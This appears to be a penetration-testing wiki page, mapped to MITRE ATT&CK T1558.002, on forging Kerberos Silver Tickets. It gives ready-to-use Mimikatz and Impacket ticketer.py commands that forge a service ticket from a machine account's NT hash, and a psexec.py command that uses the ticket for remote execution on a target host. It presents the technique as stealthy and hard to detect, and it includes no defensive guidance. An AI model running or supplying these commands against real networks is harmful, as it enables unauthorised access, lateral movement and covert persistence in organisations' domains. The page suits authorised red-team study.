---
description: MITRE ATT&CK, Credential Access, Technique T1558.002
---

# Create Silver Ticket

### Description

A Silver Ticket is a forged TGS, signed using the secret keys of a machine account. This can be useful for short-term persistence and is considered stealthy. The large benefit of creating a silver ticket is that we can create it offline, meaning that it can be very hard for an organization to track when one is created.&#x20;

### Mimikatz

Creation of a silver ticket utilizing Mimikatz:

```bash
kerberos::golden /user:Administrator /domain:$domain /sid:$domain_sid /target:$target_machine /service:cifs /rc4:$nthash /ticket:$output
```

### Ticketer.py

Creation of a silver ticket using Impacket:

```bash
ticketer.py -nthash $nthash -domain-sid $domain_sid -domain $domain -spn cifs/$target_machine $u
export KRB5CCNAME=$user.ccache
```

### Utilizing the Silver Ticket

Utilizing a silver ticket using Impacket:&#x20;

```bash
psexec.py $domain/$user@$target_machine -k -no-pass
```

### References

{% embed url="https://adsecurity.org/?page_id=183" %}
